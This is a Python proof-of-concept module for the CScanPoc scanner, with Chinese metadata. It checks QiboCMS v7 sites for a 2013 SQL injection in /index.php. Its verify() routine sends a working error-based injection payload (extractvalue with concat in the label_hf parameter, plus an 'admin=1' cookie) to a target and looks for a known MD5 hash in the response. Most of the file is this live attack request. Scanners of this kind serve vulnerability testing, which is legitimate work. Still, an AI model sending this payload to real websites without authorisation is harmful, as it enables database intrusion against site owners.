# coding: utf-8

from CScanPoc.thirdparty import requests,hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import re
hh = hackhttp.hackhttp()

class Vuln(ABVuln):
    vuln_id = 'QiboCMS_0007' # 平台漏洞编号，留空
    name = '齐博CMS v7整站系统 /index.php SQL注入' # 漏洞名称
    level = VulnLevel.HIGH # 漏洞危害级别
    type = VulnType.INJECTION # 漏洞类型
    disclosure_date = '2013-03-13'  # 漏洞公布时间
    desc = '''
        齐博CMS v7整站系统 /index.php SQL注入漏洞
    ''' # 漏洞描述
    ref = 'Unkonwn' # 漏洞来源
    cnvd_id = 'Unkonwn' # cnvd漏洞编号
    cve_id = 'Unkonwn' #cve编号
    product = 'QiboCMS(齐博CMS)'  # 漏洞应用名称
    product_version = 'Unkonwn'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '95e46669-4251-4f4f-9088-698d058a0259'
    author = '国光'  # POC编写者
    create_date = '2018-05-15' # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            arg = '{target}'.format(target=self.target)
            payload = '/index.php?jobs=show&label_hf[1%27%20and%20extractvalue(1,concat(0x5c,md5(3.1415)))%23][2]=asd'
            cookie = 'admin=1'
            target = arg + payload
            code, head, res, errcode, final_url = hh.http('-b %s %s' % (cookie,target))
                       
            if code == 200:  
                m = re.search('63e1f04640e83605c1d177544a5a0488', res)
                if m:
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(target=self.target,name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        super(Poc, self).exploit()


if __name__ == '__main__':
    Poc().run()